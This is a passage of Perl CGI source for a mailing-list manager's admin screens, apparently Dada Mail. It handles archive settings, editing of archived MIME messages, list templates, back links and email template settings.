        my $archives_available_only_to_subscribers = xss_filter($q->param('archives_available_only_to_subscribers')) || 0;
		my $archive_messages          = xss_filter($q->param('archive_messages'))          || 0; 
        my $archive_subscribe_form    = xss_filter($q->param('archive_subscribe_form'))    || 0; 
        my $archive_search_form       = xss_filter($q->param('archive_search_form'))       || 0; 
        my $archive_send_form         = xss_filter($q->param('archive_send_form'))         || 0; 
        my $captcha_archive_send_form = xss_filter($q->param('captcha_archive_send_form')) || 0; 
        my $send_newest_archive       = xss_filter($q->param('send_newest_archive'))       || 0; 
    

        $ls->save({
            show_archives             => $show_archives,
			archives_available_only_to_subscribers => $archives_available_only_to_subscribers, 
            archive_messages          => $archive_messages,
            archive_subscribe_form    => $archive_subscribe_form,
            archive_search_form       => $archive_search_form,
            captcha_archive_send_form => $captcha_archive_send_form, 
            archive_send_form         => $archive_send_form,
            send_newest_archive       => $send_newest_archive, 
         }); 

        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=archive_options&done=1');  
    }
}




sub adv_archive_options { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'adv_archive_options');
    
    $list = $admin_list; 


    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 


    my $ls = DADA::MailingList::Settings->new({-list => $list});
    my $li = $ls->get; 
    
    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
           
    my $la = DADA::MailingList::Archives->new({-list => $list}); 
    
    if(!$process) { 
    
        my @index_this = ($li->{archive_index_count},1..10,15,20,25,30,40,50,75,100);

        my $archive_index_count_menu = $q->popup_menu(-name  => 'archive_index_count',
                                                      -id    => 'archive_index_count',
                                                      -value => [@index_this]
                                                     );
                                              
        
        my $ping_sites = []; 
		foreach ( @DADA::Config::PING_URLS ) { 
	
        	push(
				@$ping_sites, 
					{ 
						
						ping_url => $_ 
					}
				) 
    	}
        
        my $can_use_xml_rpc = 1; 
        
        eval { require XMLRPC::Lite }; 
        if($@){ 
	         $can_use_xml_rpc = 0;
        }

    	my $can_use_html_scrubber = 1; 
        
        eval { require HTML::Scrubber; }; 
        if($@){ 
         $can_use_html_scrubber = 0;
        }

    	my $can_use_recaptcha_mailhide = 0; 
        
        eval { require Captcha::reCAPTCHA::Mailhide; }; 
        if(!$@){ 
	
			if(
				!defined($DADA::Config::RECAPTHCA_MAILHIDE_PARAMS->{public_key}) ||
				!defined($DADA::Config::RECAPTHCA_MAILHIDE_PARAMS->{private_key})
			){ 
				warn 'You need to configure Recaptcha Mailhide in the DADA::Config.pm file!';
			}	
		
         $can_use_recaptcha_mailhide = 1;
        }
 

        my $can_use_gravatar_url = 0; 
        my $gravatar_img_url     = ''; 
        eval {require Gravatar::URL}; 
        if(!$@){
           $can_use_gravatar_url = 1; 
           require Email::Address; 
			if(isa_url($li->{default_gravatar_url})){ 

           		$gravatar_img_url = Gravatar::URL::gravatar_url(email => $ls->param('list_owner_email'), default => $li->{default_gravatar_url});
			}
			else { 
				$gravatar_img_url = Gravatar::URL::gravatar_url(email => $ls->param('list_owner_email'));
			}
        }else{ 
           $can_use_gravatar_url = 0;
        }

        print(admin_template_header(-Title      => "Advanced Archive Options", 
                                -List       => $list,
                                -Root_Login => $root_login));

        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'adv_archive_options_screen.tmpl', 
                                              -vars   => {
															screen                       => 'adv_archive_options', 
															title                        => 'Advanced Archive Options',
															
                                                     		done                         => $done, 
                                                            stop_message_at_sig          => $li->{stop_message_at_sig}, 
                                                            sort_archives_in_reverse     => $li->{sort_archives_in_reverse}, 
                                                            archive_show_day             => $li->{archive_show_day}, 
                                                            archive_show_month           => $li->{archive_show_month}, 
                                                            archive_show_year            => $li->{archive_show_year}, 
                                                            archive_show_hour_and_minute => $li->{archive_show_hour_and_minute},
                                                            archive_show_second          => $li->{archive_show_second}, 
                                                            archive_index_count_menu     => $archive_index_count_menu, 
                                                            publish_archives_rss         => $li->{publish_archives_rss}, 
                                                            list                         => $list,
                                                            ping_archives_rss            => $li->{ping_archives_rss}, 
                                                            ping_sites                   => $ping_sites, 
                                                            can_use_xml_rpc              => $can_use_xml_rpc, 
                                                            html_archives_in_iframe      => $li->{html_archives_in_iframe}, 
                                                            disable_archive_js           => $li->{disable_archive_js},
                                                            can_use_html_scrubber        => $can_use_html_scrubber, 
                                                            
                                                            style_quoted_archive_text    => $li->{style_quoted_archive_text}, 
                                                            
                                                            display_attachments          => $li->{display_attachments},
                                                            
                                                            can_display_attachments      => $la->can_display_attachments,
                                                            add_subscribe_form_to_feeds  => $li->{add_subscribe_form_to_feeds}, 
                                                            
                                                            add_social_bookmarking_badges => $li->{add_social_bookmarking_badges}, 
															can_use_recaptcha_mailhide    => $can_use_recaptcha_mailhide, 
                                                            
															can_use_gravatar_url          => $can_use_gravatar_url, 
															gravatar_img_url              => $gravatar_img_url, 
														    enable_gravatars              => $li->{enable_gravatars}, 
                                                            default_gravatar_url          => $li->{default_gravatar_url}, 
         	
                                                            (($li->{archive_protect_email} eq 'none') ? 
                                                                (archive_protect_email_none => 1,)    : 
                                                                (archive_protect_email_none => 0,)
                                                            ),
                                                            (($li->{archive_protect_email} eq 'spam_me_not') ? 
                                                                (archive_protect_email_spam_me_not => 1,)    : 
                                                                (archive_protect_email_spam_me_not => 0,)
                                                            ),
                                                             (($li->{archive_protect_email} eq 'recaptcha_mailhide') ? 
                                                                (archive_protect_email_recaptcha_mailhide => 1,)    : 
                                                                (archive_protect_email_recaptcha_mailhide => 0,)
                                                            ),
                                                            
                                                            
                                                            
                                                                
                                                            
                                                            
                                                            },
                                             });
                                  
        print(admin_template_footer(-List => $list));

    }else{ 

        my $sort_archives_in_reverse      = $q->param('sort_archives_in_reverse')     || 0;
        my $archive_show_year             = $q->param('archive_show_year')            || 0; 
        my $archive_show_month            = $q->param('archive_show_month')           || 0; 
        my $archive_show_day              = $q->param('archive_show_day')             || 0;  
        my $archive_show_hour_and_minute  = $q->param('archive_show_hour_and_minute') || 0;  
        my $archive_show_second           = $q->param('archive_show_second')          || 0; 
        my $archive_index_count           = $q->param('archive_index_count')          || 10;
        my $stop_message_at_sig           = $q->param('stop_message_at_sig')          || 0;
        my $publish_archives_rss          = $q->param('publish_archives_rss')         || 0;
        my $ping_archives_rss             = $q->param('ping_archives_rss')            || 0; 
        
        my $html_archives_in_iframe       = $q->param('html_archives_in_iframe')      || 0; 
        my $disable_archive_js            = $q->param('disable_archive_js')           || 0; 
        my $style_quoted_archive_text     = $q->param('style_quoted_archive_text')    || 0; 
        my $display_attachments           = $q->param('display_attachments')          || 0; 
        my $add_subscribe_form_to_feeds   = $q->param('add_subscribe_form_to_feeds')  || 0; 
        my $add_social_bookmarking_badges = $q->param('add_social_bookmarking_badges') || 0; 
        
        my $archive_protect_email         = $q->param('archive_protect_email') || undef; 
        
		my $enable_gravatars              = $q->param('enable_gravatars') || 0;  
 		my $default_gravatar_url          = $q->param('default_gravatar_url') || ''; 

		
        $ls->save({  stop_message_at_sig          => $stop_message_at_sig,
                     sort_archives_in_reverse     => $sort_archives_in_reverse,
                     archive_show_year            => $archive_show_year,
                     archive_show_month           => $archive_show_month,
                     archive_show_day             => $archive_show_day,
                     archive_show_hour_and_minute => $archive_show_hour_and_minute,
                     archive_show_second          => $archive_show_second,
                     archive_index_count          => $archive_index_count,
                     publish_archives_rss         => $publish_archives_rss, 
                     ping_archives_rss            => $ping_archives_rss, 
                     html_archives_in_iframe      => $html_archives_in_iframe, 
                     disable_archive_js           => $disable_archive_js, 
                     style_quoted_archive_text    => $style_quoted_archive_text, 
                     display_attachments          => $display_attachments, 
                     add_subscribe_form_to_feeds  => $add_subscribe_form_to_feeds, 
                     add_social_bookmarking_badges => $add_social_bookmarking_badges, 
                     
                     archive_protect_email         => $archive_protect_email, 

					enable_gravatars               => $enable_gravatars, 
					default_gravatar_url           => $default_gravatar_url, 

                  });

        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=adv_archive_options&done=1'); 
        
    }
}




sub edit_archived_msg {
    
    require DADA::Template::HTML; 
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle;

    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;

    require DADA::Mail::Send; 
    
    require MIME::Parser;
    
    my $parser = new MIME::Parser; 
       $parser = optimize_mime_parser($parser); 
        
    my $skel = []; 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q, 
                                                        -Function => 'edit_archived_msg');
    my $list = $admin_list; 
    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
             
    my $li = $ls->get; 
    
    my $mh = DADA::Mail::Send->new(
				{
					-list   => $list, 
					-ls_obj => $ls, 
				}
			 );
    my $ah = DADA::MailingList::Archives->new({-list => $list}); 
    
    edit_archived_msg_main();
    #---------------------------------------------------------------------#
    
    sub edit_archived_msg_main { 
        
        if($q->param('process') eq 'prefs'){ 
            &prefs; 
        }else{ 
        
            if($q->param('process')){    
                &edit_archive; 
            }else{ 
                &view;    
            }
        }
    }
    
    
    sub view { 
    
    
        my $D_Content_Types = [
        'text/plain', 
        'text/html'
        ];
        
        my %Headers_To_Edit;
    
       my $parser = new MIME::Parser; 
       $parser = optimize_mime_parser($parser); 
       
        my $id = $q->param('id');
        
        if(!$id){ 
            print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=view_archive'); 
            exit; 
        }
            
        if($ah->check_if_entry_exists($id) <= 0){
            print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=view_archive'); 
            exit; 
        }
                
                
        my ($subject, $message, $format, $raw_msg) = $ah->get_archive_info($id); 
        
        # do I need this?
        $raw_msg ||= $ah->_bs_raw_msg($subject, $message, $format); 
        $raw_msg =~ s/Content\-Type/Content-type/; 
        
        
        
        print(admin_template_header(-Title      => "Edit Archived Message",
                                -List       => $li->{list},
                                -Form       => 0,
                                -Root_Login => $root_login));
        
        if($q->param('done')){
            print $DADA::Config::GOOD_JOB_MESSAGE;
        }
        
        if($ah->can_display_message_source){ 
        
            print qq{<p style="text-align:right">
                    <a href="$DADA::Config::S_PROGRAM_URL?f=display_message_source&amp;id=$id" target="_blank"> 
                     Display Original Message Source
                    </a>
                   </p>}; 
        
        }
        
        
        
        print qq{<form action="$DADA::Config::S_PROGRAM_URL" enctype="multipart/form-data" method="post">
                 <input type="hidden" name="f" value="edit_archived_msg" /> 
                 
        }; 
        
        my $entity; 
        
        eval { $entity = $parser->parse_data($raw_msg) };
        
        make_skeleton($entity);
            
            
        foreach(split(',', $li->{editable_headers})){ 
            $Headers_To_Edit{$_} = 1; 
        }
        
        foreach my $tb(@$skel){
        
            my @c = split('-', $tb->{address}); 
            my $bqc = $#c -1; 
            
            for(0..$bqc){ print '<div style="padding-left: 30px; border-left:1px solid #ccc">'; }
        
    
            if($tb->{address} eq '0'){ 
                print '<table width="100%">'; 
    
                # head of the message!  
                my %headers = $mh->return_headers($tb->{entity}->head->original_text); 
                foreach my $h(@DADA::Config::EMAIL_HEADERS_ORDER){ 
                    if($headers{$h}){ 
                        if($Headers_To_Edit{$h} == 1){ 
                            print '<tr><td>'; 
                            print $q->p($q->label({'-for' => $h}, $h . ': '));
                            print '</td><td width="99%">'; 
                            
                            if($DADA::Config::ARCHIVE_DB_TYPE eq 'Db' && $h eq 'Content-type'){ 
                                push(@{$D_Content_Types}, $headers{$h});   
                                print $q->p($q->popup_menu('-values' => $D_Content_Types, -id => $h, -name => $h, -default => $headers{$h})); 
                            }else{ 
								my $value = $headers{$h}; 
								if($ls->param('mime_encode_words_in_headers') == 1){ 
									if($h =~ m/To|From|Cc|Reply\-To|Subject/){ 
										$value = $ah->_decode_header($value); 
									}
								}
                                print $q->p($q->textfield(-value => $value, -id => $h, -name => $h, -class => 'full')); 
                            }
                            
                            print '</td></tr>'; 
                        }
        
        
                    }
        
                }
                print '</table>'; 
            }
            my ($type, $subtype) = split('/', $tb->{entity}->head->mime_type);
            
    
            print $q->p($q->strong('Content Type: '), $tb->{entity}->head->mime_type); 
    
            if($tb->{body}){ 
    
                if ($type =~ /^(text|message)$/ && $tb->{entity}->head->get('content-disposition') !~ m/attach/i) {     # text: display it...
                    
                    #$q->checkbox(-name => 'delete_' . $tb->{address}, -value => 1, -label => '' ), 'Delete?', $q->br(),
                
                if ($subtype =~ /html/ && $DADA::Config::FCKEDITOR_URL){ 
                    
                        require DADA::Template::Widgets;
                        print DADA::Template::Widgets::screen({-screen => 'edit_archived_msg_textarea.widget', 
                                                              -vars   => {
                                                                            name  => $tb->{address},
                                                                            value => js_enc($tb->{entity}->bodyhandle->as_string()),
                                                              }
                                                             });                
                    }else{ 
                    
                        print $q->p($q->textarea(-value => $tb->{entity}->bodyhandle->as_string, -rows => 15, -name => $tb->{address}));
                    
                    }
            
                }else{ 
                
                    
                    print '<div style="border: 1px solid #000;padding: 5px">';
                                    
                    my $name = $tb->{entity}->head->mime_attr("content-type.name") || 
                               $tb->{entity}->head->mime_attr("content-disposition.filename"); 
    
                    my $attachment_url;
                    
                    if($name){ 
                        $attachment_url = $DADA::Config::S_PROGRAM_URL . '?f=file_attachment&l=' . $list . '&id=' . $id . '&filename=' . $name . '&mode=inline';
                    }else{ 
    
                        $name ='Untitled.'; 
                        
                        my $m_cid = $tb->{entity}->head->get('content-id'); 
                           $m_cid =~ s/^\<|\>$//g;
               
                        $attachment_url = $DADA::Config::S_PROGRAM_URL . '?f=show_img&l=' . $list . '&id=' . $id . '&cid=' . $m_cid;
    
                    }
                    
                    print $q->p($q->strong('Attachment: ' ), $q->a({-href => $attachment_url, -target => '_blank'}, $name)); 
                    
                    print '<table style="padding:5px">'; 
                    
                    print '<tr><td>'; 
                    
                    if($type =~ /^image/ && $subtype =~ m/gif|jpg|jpeg|png/){ 
                        print $q->p($q->a({-href => $attachment_url, -target => '_blank'}, $q->img({-src => $attachment_url, -width => '100'}))); 
                    }else{ 
                        #print $q->p($q->a({-href => $attachment_url, -target => '_blank'}, $q->strong('Attachment: ' ), $q->a({-href => $attachment_url, -target => '_blank'}, $name)));
                    }
                    print '</td><td>'; 
                    
                    print $q->p($q->checkbox(-name => 'delete_' . $tb->{address}, -id => 'delete_' . $tb->{address}, -value => 1, -label => '' ), $q->label({'-for' => 'delete_' . $tb->{address}}, 'Remove From Message')); 
                    print $q->p($q->strong('Update:'), $q->filefield(-name => 'upload_' . $tb->{address})); 
                    
                    print '</td></tr></table>';
                    
                    print '</div>';
                    
                    
                }
            }
            
            for(0..$bqc){ print '</div>'; }
        }
        
        #footer
        
        print $q->hidden('process' , 1); 
        print $q->hidden('id', $id); 
    
        print qq{
        
        <hr /> 
        
        <p><a href="$DADA::Config::S_PROGRAM_URL?flavor=view_archive&id=$id">&lt;-- View Saved Message</a></p>
        
        <div class="buttonfloat">
         <input type="reset" class="cautionary"  value="Clear Changes" />
         <input type="submit" class="processing" value="Save Changes" />
        </div>
        <br />
        <div class="floatclear"></div>
        
        }; 
    
        print '</form>'; 
        
        print qq{<p style="text-align:right"><a href="$DADA::Config::S_PROGRAM_URL?flavor=edit_archived_msg&process=prefs&id=$id">Archive Editor Preferences...</a></p>};
        print admin_template_footer(-List => $list, -Form => 0); 
    
    }
    
    
    
    
    sub prefs { 
    
        if($q->param('process_prefs')){ 
        
            my $the_id = $q->param('id'); 
    
            my $editable_headers = join(',', $q->param('editable_header')); 
            $ls->save({editable_headers => $editable_headers}); 
            
            print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=edit_archived_msg&process=prefs&done=1&id=' . $the_id); 
            exit; 
            
            
        }else{ 
        
        my %editable_headers; 
           $editable_headers{$_} = 1 foreach(split(',', $li->{editable_headers}));
           
        my $edit_headers_menu = [];  
        foreach(@DADA::Config::EMAIL_HEADERS_ORDER){ 
            
            push(@$edit_headers_menu, {name => $_, editable => $editable_headers{$_}});
        }
        
        
        
    
        print(admin_template_header(-Title      => "Edit Archived Message Preferences",
                                -List       => $li->{list},
                                -Form       => 0,
                                -Root_Login => $root_login));
        
    my $the_id = $q->param('id'); 
    my $done   = $q->param('done'); 
    
    
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen   => 'edit_archived_msg_prefs_screen.tmpl', 
                                              -vars     => {
                                                            edit_headers_menu => $edit_headers_menu,
                                                            done              => $done, 
                                                            id                => $the_id, 
                                                      },
                                             });
    
        print admin_template_footer(-List => $list, -Form => 0); 
    
        }
    
        
    }
    
    sub edit_archive { 
    
        
        my $id = $q->param('id'); 
        
        my $parser = new MIME::Parser; 
        $parser = optimize_mime_parser($parser); 
       
        my ($subject, $message, $format, $raw_msg) = $ah->get_archive_info($id); 
        
        $raw_msg ||= $ah->_bs_raw_msg($subject, $message, $format); 
        $raw_msg =~ s/Content\-Type/Content-type/; 
    
        my $entity; 
        
        eval { $entity = $parser->parse_data($raw_msg) };
    
        my $throwaway = undef; 
        
        ($entity, $throwaway) = edit($entity);
        
        
        # not sure if this, "if" is needed.
        if($DADA::Config::ARCHIVE_DB_TYPE eq 'Db'){ 
            $ah->set_archive_info($id, $entity->head->get('Subject', 0), undef, $entity->head->get('Content-type', 0), $entity->as_string); 
        }else{ 
        
            $ah->set_archive_info($id, $entity->head->get('Subject', 0), undef, undef, $entity->as_string); 
        }
        
        
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=edit_archived_msg;id=' . $id . '&done=1'); 
        
    
    }
    
    sub make_skeleton {
        my ($entity, $name) = @_;
        defined($name) or $name = "0";
        
        my $IO;
        # Output the body:
        my @parts = $entity->parts;
        if (@parts) {             
        
            push(@$skel, {address => $name, entity => $entity}); 
    
            # multipart... 
            my $i;
            foreach $i (0 .. $#parts) {       # dump each part...
                make_skeleton($parts[$i], ("$name\-".($i)));
            }
            
    
        }else {                            # single part...    
            push(@$skel, {address => $name, entity => $entity, body => 1}); 
    
        }
    }
    
    
    
    
    sub edit { 
    
        my ($entity, $name) = @_;
        defined($name) or $name = "0";
        my $IO;
        
        my %Headers_To_Edit;
    
        if($name eq '0'){ 
        
            foreach(split(',', $li->{editable_headers})){ 
                $Headers_To_Edit{$_} = 1; 
            }
        
			require DADA::App::FormatMessages; 
			my $fm = DADA::App::FormatMessages->new(-List => $list); 
			
            foreach my $h(@DADA::Config::EMAIL_HEADERS_ORDER){ 
                if($Headers_To_Edit{$h} == 1){
					my $value = $q->param($h); 
	                # Dum, what to do here? 
					if($h =~ m/To|From|Cc|Reply\-To|Subject/){ 
						$value = $fm->_encode_header($h, $value)
							if $fm->im_encoding_headers; 
					}
                    $entity->head->replace($h, $value); 
                }
            }
        }
        
        
        
        my @parts = $entity->parts;
        if (@parts) {             
        
            # multipart... 
            my $i;
            foreach $i (0 .. $#parts) {       
                
                my $name_is; 
                
                # I don't understand this part...
                ($parts[$i], $name_is) = edit($parts[$i], ("$name\-".($i)));
                
                if($q->param('delete_' . $name_is) == 1){ 
                     splice(@parts, $i, 0);

                    #delete($parts[$i]);
                }
            }
            #love it. #love it love it. 
            $entity->parts(\@parts);                           
            $entity->sync_headers('Length'      =>  'COMPUTE',
                                  'Nonstandard' =>  'ERASE');
            
        }else {                             
            
            return (undef, $name) if($q->param('delete_' . $name) == 1);
        
            my $content = $q->param($name); 
               $content =~ s/\r\n/\n/g;

            if($content){            
                   my $body    = $entity->bodyhandle;
                   my $io = $body->open('w');
                      $io->print( $content );
                      $io->close;
            
            }
                
            my $cid = $entity->head->get('content-id') || undef; 
            
            if($q->param('upload_' . $name)){ 
                $entity = get_from_upload($name,  $cid); 
            }
            
            $entity->sync_headers('Length'      =>  'COMPUTE',
                                  'Nonstandard' =>  'ERASE');
    
            return ($entity, $name); 
            
        }
        
        return ($entity, $name); 
    
     }
     
     
     
     
     sub get_from_upload {  
    
        my $name = shift;
        my $cid  = shift; 
        
        my $filename = file_upload('upload_' . $name); 
        my $data; 
        
        my $nice_filename = $q->param('upload_' . $name);
    
        require MIME::Entity; 
        my $ent = MIME::Entity->build(
                                      Path        => $filename,
                                      Filename    => $nice_filename, 
                                      Encoding    => "base64",
                                      Disposition => "attachment",
                                      Type        => find_attachment_type($filename), 
                                      Id          => $cid, 
                                     );
        return $ent; 
        
     }
 
}




sub html_code { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'html_code');

    $list = $admin_list; 
    
    print(admin_template_header(-Title      => "Subscription Form HTML", 
                            -List       => $list,
                            -Root_Login => $root_login,
                            -Form       => 0, 
                            
                           ));
   
   
    require DADA::Template::Widgets;
    print DADA::Template::Widgets::screen({-screen => 'html_code_screen.tmpl',
                                          -vars                => { 
					
											screen             => 'html_code', 
											title              => 'Subscription Form HTML', 
											
                                            list               => $list, 
                                            subscription_form  => DADA::Template::Widgets::subscription_form({-list => $list, -ignore_cgi => 1}),  
                                            
                                          }
                                        });
    
    print(admin_template_footer(-List => $list, -Form => 0));
    
}




sub edit_template {

    my ($admin_list, $root_login) = check_list_security(
		-cgi_obj  => $q,                                     
        -Function => 'edit_template'
	);

    $list = $admin_list; 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
	require DADA::Template::Widgets; 
	my $raw_template = DADA::Template::Widgets::_raw_screen({-screen => 'default_list_template.tmpl'}); 
	
    my $default_template = default_template(); 
    
    
    if(!$process) { 
            
        my $edit_this_template = $default_template . "\n";
           $edit_this_template = open_template(-List => $list) . "\n"
            if check_if_template_exists( -List => $list ) >= 1; 

        my $get_template_data_from_default_template = 0; 
           $get_template_data_from_default_template = 1
            if $li->{get_template_data} eq 'from_default_template';
            

        my $get_template_data_from_template_file = 0; 
           $get_template_data_from_template_file = 1
            if $li->{get_template_data} eq 'from_template_file';

        my $get_template_data_from_url = 0; 
           $get_template_data_from_url = 1
            if $li->{get_template_data} eq 'from_url';

        my $can_use_lwp_simple; 
        eval { require LWP::Simple; };
        $can_use_lwp_simple = 1    
            if !$@; 
            
        
        my $template_url_check = 1;
        
        if($get_template_data_from_url == 1){ 
        
            if($can_use_lwp_simple == 1){ 
            
                if(LWP::Simple::get($li->{url_template})){ 
                    # ...
                } else { 
                
                $template_url_check = 0; 
                
                }
            }   
        }        
        
        print(admin_template_header(-Title      => "Your Mailing List Template", 
                                -List       => $li->{list},
                                -Root_Login => $root_login,
                                -Form       => 0, 
                                ));

        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'edit_template_screen.tmpl', 
                                              -vars   => {
	
															screen                                  => 'edit_template', 
															title                                   => 'Your Mailing List Template', 
                                                            done                                    => $done,
                                                            edit_this_template                      => $edit_this_template, 
                                                            get_template_data                       => $li->{get_template_data}, 
                                                            get_template_data_from_url              => $get_template_data_from_url, 
                                                            get_template_data_from_template_file    => $get_template_data_from_template_file, 
                                                            get_template_data_from_default_template => $get_template_data_from_default_template, 
                                                            can_use_lwp_simple                      => $can_use_lwp_simple, 
                                                            url_template                            => $li->{url_template}, 
                                                            default_template                        => $default_template, 
                                                            apply_list_template_to_html_msgs        => $li->{apply_list_template_to_html_msgs}, 
                                                            
                                                            template_url_check                      => $template_url_check, 
                                                            
                                                          },
                                            });

        print(admin_template_footer(-List => $list, -Form => 0));
 
    }else{ 
        
        if($process eq "preview template")  {
            
                my $template_info;
                my $test_header;
           my $test_footer;
        
            if($q->param('get_template_data') eq 'from_default_template'){ 
				$template_info = $raw_template; 
            }
			elsif($q->param('get_template_data') eq 'from_url'){ 
                eval {require LWP::Simple;};
                if(!$@){ 
                    $template_info = LWP::Simple::get($q->param('url_template'));
                }    
            }else{  
                $template_info = $q->param("template_info"); 
                # This... gotta change...($test_header, $test_footer) = split(/\[dada\]/,$template_info);
            }

            print(list_template(-Part       => "header",
                                -Title      => "Preview",
                                -data       => \$template_info, 
								-List          => $list, 
                          ));
           

			require DADA::Template::Widgets; 
			print DADA::Template::Widgets::screen(
					{
						-screen => 'preview_template.tmpl',
						-list_settings_vars_param => { 
							-list    => $list,
							-dot_it => 1, 
					
							
						},
					}
			); 
			
		            print(list_template(-Part       => "footer",
		                                -data       => \$template_info, 
										-List          => $list, 
		
		                          ));

        }else{
        


            my $template_info     = $q->param("template_info"); 
                        
            my $get_template_data = $q->param("get_template_data") || '';
            my $url_template      = $q->param('url_template')      || ''; 
            my $apply_list_template_to_html_msgs = $q->param('apply_list_template_to_html_msgs') || 0;    
            
            require DADA::MailingList::Settings;
                   $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    
            $ls->save({
                       apply_list_template_to_html_msgs => $apply_list_template_to_html_msgs, 
                       url_template                     => $url_template,
                       get_template_data                => $get_template_data,
                       });
                       
            make_template({-List => $list, -Template  => $template_info});
            
            $c->flush;
            
            print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=edit_template&done=1');
            return;
        }
    }
}




sub back_link { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'back_link');

    $list = $admin_list;

    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
        
    if(!$process){ 
    
        print(admin_template_header(-Title      => "Create a Back Link", 
                                -List       => $list,
                                -Root_Login => $root_login));
    
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-screen => 'back_link_screen.tmpl',
                                                -list   => $list,
                                                -vars   => { 
																screen       => 'back_link',
																title        => 'Create a Back Link', 
                                                                website_name => $li->{website_name}, 
                                                                website_url  => $li->{website_url}, 
                                                                done         => (($q->param('done')) ? ($q->param('done')) : (0)), 
                                                           },
                                                }); 
        print(admin_template_footer(-List => $list));

    }else{ 

        my $website_name = $q->param("website_name") || ''; 
        my $website_url  = $q->param("website_url")  || ''; 
         
        $ls->save({website_name  =>   $website_name,
                   website_url   =>   $website_url,
                 });
                 
        print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=back_link&done=1'); 
    }
}




sub edit_type {

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'edit_type');
    $list = $admin_list; 
    
    require DADA::Template::Widgets; 
    
    
    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    
    # Backwards Compatibility!
    foreach(qw(
        confirmation_message
        subscribed_message
        
        unsub_confirmation_message
        unsubscribed_message
        
        mailing_list_message
        mailing_list_message_html

        not_allowed_to_post_message
        send_archive_message
        send_archive_message_html
        you_are_already_subscribed_message
        email_your_subscribed_msg
    )){ 
        my $m = $li->{$_}; 
        DADA::Template::Widgets::dada_backwards_compatibility(\$m); 
         $li->{$_} = $m;
    }
    
    
    if(!$process){ 

        print(admin_template_header(-Title      => "Email Templates", 
                                -List       => $list,
                                -Root_Login => $root_login));
        
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-screen => 'edit_type_screen.tmpl',
                                            -list   => $list,
                                            -vars   => { 
                                                        
														screen                        => 'edit_type', 
														title                         => 'Email Templates', 
													
                                                        list_owner_email              => $li->{list_owner_email}, 
                                                        
                                                        done                          => $done, 
                                                        
                                                        confirmation_message_subject => $li->{confirmation_message_subject}, 
                                                        
                                                        
                                                        confirmation_message         => $li->{confirmation_message}, 
                                                        
                                                        subscribed_message_subject  => $li->{subscribed_message_subject}, 
                                                        subscribed_message          => $li->{subscribed_message}, 

                                                        unsub_confirmation_message_subject => $li->{unsub_confirmation_message_subject}, 
                                                        unsub_confirmation_message         => $li->{unsub_confirmation_message}, 
                                                        
                                                        
                                                        unsubscribed_message_subject   => $li->{unsubscribed_message_subject}, 
                                                        unsubscribed_message           => $li->{unsubscribed_message}, 

                                                        mailing_list_message_from_phrase => $li->{mailing_list_message_from_phrase},
                                                        mailing_list_message_to_phrase   => $li->{mailing_list_message_to_phrase},                                                        
                                                        mailing_list_message_subject     => $li->{mailing_list_message_subject},
                                                        mailing_list_message             => $li->{mailing_list_message}, 
                                                        mailing_list_message_html        => $li->{mailing_list_message_html}, 
                                                        
                                                        not_allowed_to_post_message_subject => $li->{not_allowed_to_post_message_subject}, 
                                                        
                                                        not_allowed_to_post_message => $li->{not_allowed_to_post_message}, 
                                                        
                                                        send_archive_message_subject => $li->{send_archive_message_subject}, 
                                                        
                                                        send_archive_message        => $li->{send_archive_message},
                                                        send_archive_message_html   => $li->{send_archive_message_html}, 
                                                        
                                                        you_are_already_subscribed_message_subject => $li->{you_are_already_subscribed_message_subject}, 
                                                        you_are_already_subscribed_message         => $li->{you_are_already_subscribed_message}, 
                                                        
                                                        email_your_subscribed_msg           => $li->{email_your_subscribed_msg}, 

														invite_message_from_phrase          => $li->{invite_message_from_phrase},
                                                        invite_message_to_phrase             => $li->{invite_message_to_phrase},
														invite_message_subject              => $li->{invite_message_subject}, 
														invite_message_text                 => $li->{invite_message_text}, 
														invite_message_html                 => $li->{invite_message_html}, 
														
														enable_email_template_expr          => $li->{enable_email_template_expr}, 
                                                        },

													-list_settings_vars       => $li, 
		                                            -list_settings_vars_param => 
														{
															-dot_it => 1,
														},
                                                }); 
 
        print(admin_template_footer(-List => $list));

    }else{ 
    
        my $confirmation_message_subject = $q->param('confirmation_message_subject') || undef; 
        my $confirmation_message         = $q->param('confirmation_message')           || undef; 
        
        my $subscribed_message_subject  = $q->param('subscribed_message_subject')  || undef; 
        my $subscribed_message          = $q->param('subscribed_message')          || undef;   
        
        
        my $unsub_confirmation_message_subject = $q->param('unsub_confirmation_message_subject') || undef; 
        my $unsub_confirmation_message  = $q->param('unsub_confirmation_message')                || undef;  
        
        
